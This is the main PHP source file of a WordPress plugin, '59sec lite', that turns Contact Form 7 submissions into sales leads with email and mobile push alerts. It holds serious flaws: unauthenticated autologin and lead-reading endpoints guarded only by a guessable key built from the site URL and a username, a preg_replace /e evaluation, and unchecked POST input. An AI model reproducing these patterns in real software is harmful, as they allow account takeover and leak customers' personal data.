<?php

/**
 * Plugin Name: 59sec lite
 * Plugin URI: https://www.59sec.com
 * Description: 59sec lite sends Contact Form 7 push notifications on your iOS or Android mobile device. Also 59sec lite helps you increase sales conversions by decreasing the response time under 59 seconds. Upgrade to 59sec PRO now at <a href="http://www.59sec.com" target="_blank">www.59sec.com</a>! Awsome premium features that will boost your sales. Free 30 days trial, no strings attached!
 * Version: 3.4
 * Author: Kuantero.com
 * Author URI: http://www.kuantero.com
 * License: GNU
 */

/*
Copyright 2014  Kuantero.com

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
*/

// init
define('_59SEC_VERSION', '3.4.0');

define('_59SEC_INCLUDE_PATH', dirname(realpath(__FILE__)));

define('_59SEC_PLUGINS_URL', plugin_dir_url(__FILE__));

define('_59SEC_HEADRES_FROM', 'From: '.get_bloginfo('name').' 59sec <'.get_bloginfo('admin_email').'>');

/* WP cron is not reliable, so we check every chance we get */
function _59sec_check_cron()
{
	// list of tasks
	if (get_option('59sec_status', 'OK') == 'OK')
	{
		_59sec_boss_alert_cron();
		_59sec_notifications_cron();
	}
}

/**
* Shhh!!
*/
function _59sec_salt($x)
{
	$pluginkey = md5(get_real_site_url());
	$y = get_real_site_url();
	$y = str_replace('http://', '', $y);
	$x = str_split($x);
	$y = str_split($y);
	$r = '';
	
	for ($i = 0, $n = count($x); $i < $n; $i++)
	{
		if (empty($y[$i]))
		{
			$y[$i] = ' ';
		}
		
		$r .= $x[$i].$y[$i];
	}
	
	return $pluginkey.base64_encode($r);
}

function _59sec_desalt($key)
{
	$salt = substr($key, 32, strlen($key));
	$salt = base64_decode($salt);
	$salt = str_split($salt);
	
	for ($i = 0, $n = count($salt); $i < $n; $i++)
	{
		if ($i % 2 == 0)
		{
			$r .= $salt[$i];
		}
	}
	
	return $r;
}

/**
 * Generate a clean domain.
 * @used: in plugin key.
 */
function get_real_site_url()
{
	$site_url = str_replace("https://", "http://", site_url());
	$site_url = str_replace("//www.", "//", $site_url);
	
	return $site_url;
}

/**
 * Check for plugin status
 */
function _59sec_checkstatus()
{
	$key = md5(get_real_site_url());

	$url = 'https://59sec.com/licence/lc.php?key='.$key.'&domain='.get_real_site_url().'&lite=1&realdomain='.site_url();

	//set 5 sec timeout
	$ctx = stream_context_create(array('http'=>array('timeout' => 5)));
	$response = file_get_contents($url, 0, $ctx);
	
	if (empty($response))
	{
		// second try
		$response = file_get_contents($url, 0, $ctx);
		
		if (empty($response))
		{
			// third try
			$response = file_get_contents($url, 0, $ctx);
		}
	}
	
	return $response;
}

/**
 * Check for requirements
 */
function _59sec_requirements()
{

	global $wpdb;
	
	// check mandatory plugin
	$active = is_plugin_active('contact-form-7/wp-contact-form-7.php');

	if (!$active)
	{
		define('_59SEC_REQUIREMENTS', false);
	}
	else
	{
		if (!class_exists('WPCF7_ContactForm') || !method_exists('WPCF7_ContactForm', 'find'))
		{
			define('_59SEC_REQUIREMENTS', false);
		}
		else
		{
			define('_59SEC_REQUIREMENTS', true);
		}
	}

	// this is the perfect place to check for version changes so..
	$version = get_option('59sec_version', '');

	if (empty($version) || $version != _59SEC_VERSION)
	{
		require_once 'classes/Leads.php';

		$leadsModel = new Leads($wpdb, $wpdb->prefix);

		$leadsModel -> updateVersion($version);

		update_option('59sec_version', _59SEC_VERSION);
	}
}


/**
 * Add settings link on plugins page
 */
function _59sec_settings_link($links)
{
	$links[] = '<a href="admin.php?page=59sec_entry_sources">Settings</a>';

	return $links;
}

/**
 * Save options
 */
function register_59sec_options()
{
	// notofications
	register_setting('59sec-notifications', '59sec_bosses');
	// entry sources
	register_setting('59sec-entry-sources', '59sec_wpcf7');
	// other options
	register_setting('59sec-other-options', '59sec_direct_login');
	register_setting('59sec-other-options', '59sec_leadscheck');
	// subscribe
	register_setting('59sec-subscribe', '59sec_subscribe_mail');
}

/* Install - Uninstall */
function _59sec_install()
{
	global $wpdb;

	// add the leads table
	$wpdb->show_errors();

	require_once 'classes/Leads.php';

	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	$sqls = $leadsModel -> constructSQL();

	foreach ($sqls as $sql)
	{
		$wpdb->query($sql);
	}

	$wpdb->hide_errors();

	// add live update cache
	update_option('59sec_liveupdate', time());
	
	// give admin agent rights
	$args = array(
		'blog_id' => $GLOBALS['blog_id'],
		'role' => 'Administrator',
	);

	$users = (array) get_users($args);

	foreach ($users as $user)
	{
		$user -> add_cap('agent');
	}
	
	// register plugin key
	$response = _59sec_checkstatus();
	
	if (empty($response))
	{
		echo 'Plugin key could not be activated!';
	}
}

function _59sec_uninstall()
{
	global $wpdb;

	require_once 'classes/Leads.php';

	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	$sql = $leadsModel -> destructSQL();

	$wpdb->query($sql);
}

/**
 * Add the page structure
 */
function _59sec_admin_menu()
{
	global $current_user;

	$icon_url = _59SEC_PLUGINS_URL.'images/25.png';
	$cap = end(array_keys($current_user->caps));
	
	add_object_page('Entry Sources', '59sec LITE', $cap, '59sec_entry_sources', '_59sec_load_page', $icon_url);
	add_submenu_page('59sec_entry_sources', 'Leads to be answered', 'LEADS', $cap, '59sec_leads_boss', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'CRM', 'CRM', $cap, '59sec_crm_boss', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Statistics', 'Statistics', $cap, '59sec_statistics_boss', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Entry Sources', 'Entry Sources', $cap, '59sec_entry_sources', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Users', 'Users', $cap, '59sec_users', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Notifications', 'Notifications', $cap, '59sec_notifications', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Other Options', 'Other Options', $cap, '59sec_other_options', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Help', 'Help', $cap, '59sec_help_boss', '_59sec_load_page');
	add_submenu_page('59sec_entry_sources', 'Please Feedback!', 'Please Feedback!', $cap, '59sec_feedback', '_59sec_load_page');
}

/**
 * Pages controller
 */
function _59sec_load_page()
{
	global $plugin_page, $wpdb, $current_user;

	require_once 'classes/Leads.php';

	// init some common vars
	$pluginkey = md5(get_real_site_url());
	$leadsModel = new Leads($wpdb, $wpdb->prefix);

	$leadsLink = '<a href="?page=59sec_leads_boss" class="link-leads">LEADS</a><span>|</span>';
	$crmLink = '<a href="?page=59sec_crm_boss" class="link-crm">CRM</a>';
	$statisticsLink = '<a href="?page=59sec_statistics_boss">Statistics</a><span>|</span>';
	$sourcesLink = '<a href="?page=59sec_entry_sources">Entry Sources</a><span>|</span>';
	$usersLink = '<a href="?page=59sec_users">Users</a><span>|</span>';
	$notificationsLink = '<a href="?page=59sec_notifications">Notifications</a><span>|</span>';
	$otherOptionsLink = '<a href="?page=59sec_other_options">Other Options</a><span>|</span>';
	$helpLink = '<a href="?page=59sec_help_boss">Help</a>';

	// add css file
	wp_enqueue_style('_59sec', plugins_url('/css/style.css', __FILE__), array(), _59SEC_VERSION);

	// add the script
	wp_enqueue_script('_59sec', plugins_url('/js/script.js', __FILE__), array(), _59SEC_VERSION, true);

	if (!_59SEC_REQUIREMENTS)
	{
		$plugin_page = 'warning';
	}

	// add subscribe message
	require_once "templates/59sec_subscribe.php";
	
	// get the data
	switch($plugin_page)
	{
		case '59sec_entry_sources':
			if (!empty($_POST))
			{
				update_option('59sec_wpcf7', $_POST['59sec_wpcf7']);
			}
			
			$args = array(
				'posts_per_page' => -1,
				'orderby' => 'title',
				'order' => 'ASC',
				'offset' => 0,
			);

			$items =  WPCF7_ContactForm::find($args);
			$forms = (array) get_option('59sec_wpcf7');			
			break;
		case '59sec_notifications':		
			$args = array(
				'blog_id'      => $GLOBALS['blog_id'],
				'orderby'      => 'login',
				'order'        => 'ASC',
				'count_total'  => false,
			);
			$users = get_users($args);
			
			foreach ($users as $user)
			{
				$bosses[] = $user->data->user_email;
			}
			
			update_option('59sec_bosses', $bosses);
			
			$bosses = get_option('59sec_bosses');
			break;
		case '59sec_leads_boss':
			$isBoss = true;
			$args = array(
				'posts_per_page' => -1,
				'orderby' => 'title',
				'order' => 'ASC',
				'offset' => 0,
			);
			$items =  WPCF7_ContactForm::find($args);
			$forms = get_option('59sec_wpcf7');
			$leadscheck = get_option('59sec_leadscheck', 3);
			
			require_once 'classes/Leads.php';
			
			$lastCheck = get_option('59sec_liveupdate', time());
						
			break;
		case '59sec_statistics_boss':
			$args = array(
				'blog_id'      => $GLOBALS['blog_id'],
				'orderby'      => 'login',
				'order'        => 'ASC',
				'count_total'  => false,
			);
			$users = get_users($args);
			
			require_once 'classes/Leads.php';
			break;
		case '59sec_users':
			$args = array(
				'blog_id'      => $GLOBALS['blog_id'],
				'orderby'      => 'login',
				'order'        => 'ASC',
				'count_total'  => false,
				'fields'       => 'all_with_meta',
			);
			$users = get_users($args);
			break;
		case '59sec_crm_boss':
			$user_id = 0;
			$keyword = '';
			
			$args = array(
				'posts_per_page' => -1,
				'orderby' => 'title',
				'order' => 'ASC',
				'offset' => 0,
			);
			$items =  WPCF7_ContactForm::find($args);
			$forms = get_option('59sec_wpcf7');
			
			require_once 'classes/Leads.php';
			
			if (!empty($_POST))
			{
				$leadsModel -> update(array(
					'user_comments' => $_POST['note'],
				), $_POST['id']);
			}
			break;
		case '59sec_other_options':
			if (!empty($_POST))
			{
				update_option('59sec_direct_login', $_POST['59sec_direct_login']);
				update_option('59sec_leadscheck', $_POST['59sec_leadscheck']);
			}
			
			$direct_login = get_option('59sec_direct_login', 1) * 1;
			$leadscheck = get_option('59sec_leadscheck', 3);
			break;
	}
	
	// the view
	require_once "templates/{$plugin_page}.php";
}

/**
 * Send bosses email alert if 600 sec have passed
 */
function _59sec_boss_alert_cron()
{
	global $wpdb;
	
	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
	// get bosses
	$users = get_option('59sec_bosses', array());
	
	if (empty($users))
	{
		$args = array(
			'blog_id'      => $GLOBALS['blog_id'],
			'orderby'      => 'login',
			'order'        => 'ASC',
			'count_total'  => false,
			'role' => 'administrator',
		);
		$bosses = get_users($args);
		
		foreach ($users as $user)
		{
			$users[] = $user->data->user_email;
		}
		
		update_option('59sec_bosses', $users);
	}
	
	// send first boss alert
	$bossalert = 600;
	$leads = $leadsModel -> getBossAlertLeads($bossalert);
	
	if (!empty($leads))
	{
		$message = "
Dear 59sec power user

You are losing money because you/your team did not grab this lead fast enough:

		";
		
		foreach ($leads as $lead)
		{
			$message .= $leadsModel -> leadAsMail($lead);
			// do not send mail twice
			$leadsModel -> bossAlerted($lead);
		}

		$message .=  "

Remember!
Answering a lead in 5 minutes increase the likelihood to close the sale 21 times more than answering in 30 minutes. (source: MIT and Kellogg study)

Good luck :)

59sec Team
go@59sec.com
https://www.59sec.com
		";
		
		foreach ($users as $boss)
		{
			wp_mail($boss, 'Lead Expired! You are losing money!', $message, array(_59SEC_HEADRES_FROM));
		}
	}

	// run only once a day
	$boss_daily_cron = intval(get_option('59sec_boss_daily_cron', 0));

	if (empty($boss_daily_cron) || $boss_daily_cron < time())
	{
		// send daily boss alerts
		$leads = $leadsModel -> getBossDailyAlerts();

		if (!empty($leads))
		{
			$total = count($leads);
			$message = "Dear owner,\n\nYesterday you had {$total} leads unanswered. This means wasted opportunities. Please make sure that your agents are grabbing the leads using 59sec as soon as possible. We love when you make money :)\n\n";
			
			foreach ($leads as $lead)
			{
				$message .= $leadsModel -> leadAsMail($lead);
			}
			
			$message .= "

Thank you
59sec Team
go@59sec.com
https://www.59sec.com";		
			
			foreach ($users as $boss)
			{
				wp_mail($boss, 'Wasted leads from yesterday @ '.site_url(), $message, array(_59SEC_HEADRES_FROM));
			}
		}
		
		// run only once a day
		update_option('59sec_boss_daily_cron', time() + 86400);
	}
}

/**
 * Resend notifications 3 times 10 min apart
 */
function _59sec_notifications_cron()
{
	global $wpdb;
	
	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);

	// did 20 min pass?
	$leads = $leadsModel -> getNotificationCronLeads20();

	if (!empty($leads))
	{
		$sound = 'cashregister3.aif';
		foreach ($leads as $lead)
		{
			include _59SEC_INCLUDE_PATH.'/simplepush.php';
		}
	}
	
	// did just 10 min pass?
	$leads = $leadsModel -> getNotificationCronLeads10();
	
	if (!empty($leads))
	{
		$sound = 'cashregister2.aif';
		foreach ($leads as $lead)
		{
			include _59SEC_INCLUDE_PATH.'/simplepush.php';
		}
	}
}

/* Hook into wpcf7 */
function hook_wpcf7($cf7)
{
	global $wpdb;
	
	$wpcf7_options = (array) get_option('59sec_wpcf7');
	
	// is user selected contact form
	if (in_array($cf7->id, $wpcf7_options))
	{
		require_once 'classes/Leads.php';
		
		$leadsModel = new Leads($wpdb, $wpdb->prefix);
			
		if ($leadsModel -> isLimitReached())
		{
			return;
		}
		
		$postdata = array();
		
		if (isset($cf7->posted_data))
		{
			$source = $cf7->posted_data;
		}
		else
		{
			$submission = WPCF7_Submission::get_instance();
  			$source = $submission->get_posted_data();
		}
		
		foreach ($source as $key => $value)
		{

			if (substr($key, 0, 3) != '_wp' && substr($key, 0, 7) != 'captcha')
			{
				if (is_array($value))
				{
					$value = implode(', ', $value);
				}
				
				$postdata[$key] = $value;
			}
		}
		$postdata['ip'] = $leadsModel -> getIP();
		
		$lead = array(
			'type' => 'form',
			'entity_id' => $cf7->id,
			'subject' => $cf7->title,
			'status' => 1,
			'created_time' => time(),
			'postdata' => serialize($postdata),
		);
		
		$lead['id'] = $leadsModel -> add($lead);
		
		// update timestamp for liveupdate
		update_option('59sec_liveupdate', time());
                
		// send notification emails
		$emails = (array) get_option('59sec_emails');
		$message = $leadsModel -> leadAsMail($lead);
		
		foreach ($emails as $email)
		{
			wp_mail($email, 'Agent Notification', $message, array(_59SEC_HEADRES_FROM));
		}
		
		// send device notification
		include_once _59SEC_INCLUDE_PATH.'/simplepush.php';
	}// IF
}

/* Grab the lead ! */
function _59sec_grabit()
{
	global $wpdb, $current_user;

	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	$lead = $leadsModel->get($_POST['id']);
	
	if (!empty($lead))
	{
		if (empty($lead['user_id']))
		{
			$result = $leadsModel -> update(array(
				'user_id' => $current_user -> ID,
				'user_name' => $current_user -> data -> display_name,
				'reserved_time' => time(),
			), $_POST['id']);
			
			update_option('59sec_liveupdate', time());
		}
		else
		{
			echo 'Lead taken by '.$lead['user_name'];
			update_option('59sec_liveupdate', time());
		}
	}
	else
	{
		echo 'Error: missing data!';
	}
	
	die();
}

/**
 * try to fix a broken serialize
 */
function _59sec_tryfix()
{
	global $wpdb;

	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	$lead = $leadsModel->get($_POST['id']);

	if (!empty($lead) && !empty($lead['postdata']))
	{
		$data = unserialize($lead['postdata']);
		
		if (!is_array($data))
		{
			// ending intrerupted ?
			$strlen = strlen($lead['postdata']);
			
			if (substr ($lead['postdata'], $strlen - 3, 3) != '";}')
			{
				$lead['postdata'] = $lead['postdata'] . '";}';
			}
			
			// fix string lengths not coresponding
			$lead['postdata'] = html_entity_decode($lead['postdata'], ENT_QUOTES, 'UTF-8');
			$lead['postdata'] = preg_replace('!s:(\d+):"(.*?)";!e', "'s:'.strlen('$2').':\"$2\";'", $lead['postdata']);

			$lead['postdata'] = $leadsModel -> repairSerializedArray($lead['postdata']);
			
			if (is_array($lead['postdata']))
			{
				$lead['postdata'] = serialize($lead['postdata']);
			}
			
			// update the lead
			$leadsModel -> update($lead, $_POST['id']);
		}
	}
	else
	{
		echo 'Error: missing data!';
	}
	
	die();
}

/* Edit CRM Note */
function _59sec_edit_note()
{
	global $wpdb;

	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
	$lead = $leadsModel -> get($_POST['id']);
	
	if (!empty($lead))
	{
		echo $lead['user_comments'];
	}
	
	die();
}

/* CRM ajax paging */
function _59sec_crm_page()
{
	global $wpdb, $current_user;

	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
	$item = new stdClass();
	$item -> id = intval($_POST['item']);
	$page = intval($_POST['page']);
	$filters = array('flag' => 0);
	$keyword = '';
	
	if (isset($_POST['status']) && !empty($_POST['status']))
	{
		$filters['status'] = $_POST['status'];
	}
	
	if (isset($_POST['keyword']) && !empty($_POST['keyword']))
	{
		$filters['keyword'] = $_POST['keyword'];
		$keyword = $_POST['keyword'];
	}

	$user_id = 0;
	$leads = $leadsModel -> getUserLeads($item->id, $user_id, $page, $filters);
	$headers = $leadsModel -> tableHeaders($leads);
	$paging = $leadsModel -> pagerUserLeads($item->id, $user_id, $page, $filters);
	
	include _59SEC_INCLUDE_PATH . '/templates/crm_table.php';
	
	die();
}

/* Change the status of the lead */
function change_lead_status()
{
	global $wpdb, $current_user;

	require_once 'classes/Leads.php';
	
	$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
	$lead = $leadsModel -> get($_POST['id']);

	if (!empty($lead))
	{
		$leadsModel -> update(array('status' => $_POST['status']), $_POST['id']);

		// additional action
		if ($_POST['status'] == 'finalized' || $_POST['status'] == 'finalized')
		{
			$leadsModel -> update(array('completed_time' => time()), $_POST['id']);
		}
	}
	
	die();
}

/* Save app tokens */
function _59sec_save_tokens()
{
	global $wpdb;
	
	if(
		isset($_POST['device_token']) &&
		!empty($_POST['device_token'])
	)
	{
		require_once 'classes/Leads.php';

		$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
		$leadsModel -> saveAppToken($_POST);
		
		echo 'success';
	}
	
	die();
}

/* Delete app tokens */
function _59sec_delete_tokens()
{
	global $wpdb;
	
	if(
		isset($_POST['device_token']) &&
		!empty($_POST['device_token'])
	)
	{
		require_once 'classes/Leads.php';

		$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
		$leadsModel -> deleteAppToken($_POST);
		
		echo 'success';
	}
	
	die();
}

function _59sec_login_redirect($redirect_to, $request, $user)
{
	if (isset($user->roles) && is_array($user->roles))
	{
		$direct_login = get_option('59sec_direct_login', 1) * 1;
		
		if (empty($direct_login))
		{
			return admin_url();
		}
		
		return admin_url() . 'admin.php?page=59sec_leads_boss';
	}
	else
	{
		return site_url();
	}
}

/**
 * get total unaswered leds and provide to the public
 */
function _59sec_unaswered()
{
	global $wpdb;

	if(
		isset($_POST['device_token']) &&
		!empty($_POST['device_token'])
	)
	{
		require_once 'classes/Leads.php';

		$leadsModel = new Leads($wpdb, $wpdb->prefix);
	
		echo $leadsModel -> getTotalUnansweredLeads();
	}
	
	die();
}

/**
 * Leads for devices
 */
function _59sec_leads()
{
	Global $wpdb;

	$response = array();
	$key = @$_POST['key'];
	$user_login = _59sec_desalt($key);
	$key = substr($key, 0, 32);
	$pluginkey = md5(get_real_site_url());

	if ($key != $pluginkey)
	{
		echo json_encode($response);
		die();
	}
		
	$user = get_user_by('login', $user_login);
		
	if (empty($user))
	{
		echo json_encode($response);
		die();
	}

	$args = array(
		'posts_per_page' => -1,
		'orderby' => 'title',
		'order' => 'ASC',
		'offset' => 0,
	);
	$items =  (_59SEC_REQUIREMENTS) ? WPCF7_ContactForm::find($args) : array();
	$forms = (array) get_option('59sec_wpcf7');
	
	require_once 'classes/Leads.php';
	$leadsModel = new Leads($wpdb, $wpdb->prefix);

	// contact form 7
	foreach ($items as $item)
	{
		if (!empty($forms) && in_array($item->id, $forms))
		{
			$leads = $leadsModel->getNewLeads($item->id);
		
			if (!empty($leads))
			{
				$response[$item->title] = array();
				$headers = $leadsModel->tableHeaders($leads);
				
				foreach($leads as $key => $lead)
				{
					$data = unserialize($lead['postdata']);
					
					if (!empty($data))
					{
						foreach($headers as $index)
						{
							if (is_array($data[$index]))
							{
								$data[$index] = implode(', ', $data[$index]);
							}
							$data[$index] = strip_tags($data[$index]);
							$data[$index] = str_replace(array("\n", "\r", "\t"), '', $data[$index]);
							$data[$index] = trim($data[$index]);
						}
						$data['TIME PASSED'] = $lead['created_time'];
						$data['grab_it_button'] = 'True';
						$response[$item->title][$lead['id']] = $data;
					}
				}
			}
		}
	}

	echo json_encode($response);
	die();
}

/**
 * Device grab lead
 */
function _59sec_grab()
{
	global $wpdb;
	
	$key = @$_POST['key'];
	$id = @$_POST['id'];
	$response = new stdClass();
	$response -> status = 'error';
	$response -> title = 'Error';
	$response -> message = '';
	
	// check if key is valid
	$user_login = _59sec_desalt($key);
	$key = substr($key, 0, 32);
	
	if(!empty($key) && !empty($user_login))
	{
		$pluginkey = md5(get_real_site_url());
		
		if ($key == $pluginkey)
		{
			$user = get_user_by('login', $user_login);
			
			if (empty($user))
			{
				$response -> message = 'Invalid key';
				echo json_encode($response);
				exit;
			}
			
			// grab the lead
			require_once 'classes/Leads.php';
			
			$leadsModel = new Leads($wpdb, $wpdb->prefix);
			$lead = $leadsModel->get($id);
			
			if (!empty($lead))
			{
				if (empty($lead['user_id']))
				{
					$result = $leadsModel -> update(array(
						'user_id' => $user -> ID,
						'user_name' => $user -> data -> display_name,
						'reserved_time' => time(),
					), $id);
					
					$response -> status = 'success';
					$response -> title = "Success, {$user -> data -> display_name}!";
					$response -> message = 'Next: call the lead NOW!';
					echo json_encode($response);
					update_option('59sec_liveupdate', time());
				}
				else
				{
					$response -> message = 'Lead grabbed by '.$lead['user_name'];
					echo json_encode($response);
				}
			}
			else
			{
				$response -> message = 'Missing data!';
				echo json_encode($response);
			}
		}
		else
		{
			$response -> message = 'Invalid key';
			echo json_encode($response);
		}
		exit;
	}

	die();
}

/**
 * create url to log in user programmatically
 */
function _59sec_autologin()
{
	global $wpdb, $current_user;
	
	$base_root = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ? 'https://' : 'http://';
    $fromDomain = str_replace($base_root, '', $_SERVER['HTTP_HOST']);
    $fromDomain = $base_root.$_SERVER['HTTP_HOST'];
	//account for subfolders
	$base = pathinfo($_SERVER["REQUEST_URI"]);
	$base = $base['dirname'];
	$base = str_replace('/wp-admin', '', $base);
	$request = str_replace($base, '', $_SERVER['REQUEST_URI']);
	$fromDomain = $fromDomain.$base;
	
	if ($fromDomain != site_url())
	{
		// a altered domain can break cookies so correct it
		wp_redirect(site_url().$request);
		exit;
	}
	
	if (is_user_logged_in())
	{
		wp_redirect(_59sec_autologin_redirect());
		exit;
	}
	
	$key = @$_POST['key'];
	$user_login = _59sec_desalt($key);
	$key = substr($key, 0, 32);
	
	if(!empty($key) && !empty($user_login))
	{
		$pluginkey = md5(get_real_site_url());
		
		if ($key == $pluginkey)
		{
			$user = get_user_by('login', $user_login);
			wp_set_current_user($user -> ID, $user -> user_login);
			wp_set_auth_cookie($user -> ID);
			wp_redirect(_59sec_autologin_redirect());
		}
		else
		{
			echo 'Invalid key';
		}
		exit;
	}
	
	die();
}

function _59sec_autologin_redirect()
{
	global $current_user;
	
	$id = @$_POST['id'];
	$id = intval($id);
	
	if (in_array('administrator', $current_user->roles))
	{
		return admin_url() . 'admin.php?page=59sec_crm_boss&lead='.$id;
	}
	elseif ($current_user->has_cap('agent'))
	{
		return admin_url() . 'admin.php?page=59sec_crm&lead='.$id;
	}
	else
	{
		return admin_url();
	}
}

function _59sec_liveupdate()
{
	global $wpdb;
	
	$lastcheck = $_POST['lastcheck'];
	$check = get_option('59sec_liveupdate', time());
	
	$newEmails = false;
	
	if ($check > $lastcheck)
	{
		require_once 'classes/Leads.php';
		$leadsModel = new Leads($wpdb, $wpdb->prefix);
		
		$newEmails = $leadsModel->checkForNewLeads($lastcheck)>0;
		// get the data
		$args = array(
			'posts_per_page' => -1,
			'orderby' => 'title',
			'order' => 'ASC',
			'offset' => 0,
		);
		$items = (_59SEC_REQUIREMENTS) ? WPCF7_ContactForm::find($args) : array();
		$forms = (array) get_option('59sec_wpcf7');
		
		$lastCheck = $check;
		
		// the view
		include 'templates/leads_tables.php';
	}
	
	die();
}

/* Add actions & filters */
// actions
add_action('wpcf7_before_send_mail', 'hook_wpcf7');
add_action('wp_ajax_59sec_delete_tokens', '_59sec_delete_tokens');
add_action('wp_ajax_nopriv_59sec_delete_tokens', '_59sec_delete_tokens');
add_action('wp_ajax_59sec_save_tokens', '_59sec_save_tokens');
add_action('wp_ajax_nopriv_59sec_save_tokens', '_59sec_save_tokens');
add_action('wp_ajax_59sec_leads', '_59sec_leads');
add_action('wp_ajax_nopriv_59sec_leads', '_59sec_leads');
add_action('wp_ajax_59sec_grab', '_59sec_grab');
add_action('wp_ajax_nopriv_59sec_grab', '_59sec_grab');
add_action('wp_ajax_59sec_autologin', '_59sec_autologin');
add_action('wp_ajax_nopriv_59sec_autologin', '_59sec_autologin');
add_action('wp_ajax_59sec_cron', '_59sec_check_cron');
add_action('wp_ajax_nopriv_59sec_cron', '_59sec_check_cron');
add_action('wp_ajax_59sec_unaswered', '_59sec_unaswered');
add_action('wp_ajax_nopriv_59sec_unaswered', '_59sec_unaswered');
//filters
add_filter('login_redirect', '_59sec_login_redirect', 10, 3);

if (is_admin())
{
	// actions
	add_action('admin_init', '_59sec_requirements');
	add_action('admin_init', 'register_59sec_options');
	add_action('admin_menu', '_59sec_admin_menu');
	add_action('wp_ajax_liveupdate', '_59sec_liveupdate');
	add_action('wp_ajax_tryfix', '_59sec_tryfix');
	add_action('wp_ajax_grapit', '_59sec_grabit');
	add_action('wp_ajax_edit_note', '_59sec_edit_note');
	add_action('wp_ajax_crm_page', '_59sec_crm_page');
	add_action('wp_ajax_change_lead_status', 'change_lead_status');
	// filters
	add_filter('plugin_action_links_'.plugin_basename(__FILE__), '_59sec_settings_link');
	// hooks
	register_activation_hook(__FILE__, '_59sec_install');
	register_deactivation_hook( __FILE__, '_59sec_uninstall');
}





